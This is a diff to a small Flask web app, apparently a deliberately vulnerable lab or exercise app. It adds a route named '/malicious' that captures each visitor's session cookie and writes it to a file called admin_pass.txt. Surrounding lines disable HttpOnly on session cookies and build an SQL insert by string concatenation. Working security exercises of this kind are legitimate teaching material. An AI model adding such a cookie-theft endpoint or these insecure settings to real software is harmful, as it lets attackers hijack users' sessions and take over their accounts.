@@ -84,6 +84,18 @@ def ping():
     return render_template('main.html', name=session['username'][0], error3=rval, news=getNews())
 
 
+@app.route('/malicious', methods=['GET'])
+def malicious():
+    """
+    Intermediary page for uploading cookie
+    :return:
+    """
+    s = request.cookies.get('session')
+    with open('admin_pass.txt', 'w') as f:
+        f.write(s)
+    return redirect('/')
+
+
 if __name__ == '__main__':
     with open('secrets.txt','r') as f:
         s = f.readlines()
@@ -97,8 +109,8 @@ if __name__ == '__main__':
         pass
     conn = sqlite3.connect(db)
     c=conn.cursor()
-    c.execute("create table NEWS(source string, text string)")
-    c.execute("create table USERS(name string, password string, email string)")
+    c.execute("CREATE TABLE IF NOT EXISTS NEWS(source string, text string)")
+    c.execute("CREATE TABLE IF NOT EXISTS USERS(name string, password string, email string)")
     c.execute("insert into users (email, name,password) values ('alice@alice.com','alice','"+alicehash+"')")
     conn.commit()
     app.config.update(SESSION_COOKIE_HTTPONLY=False)
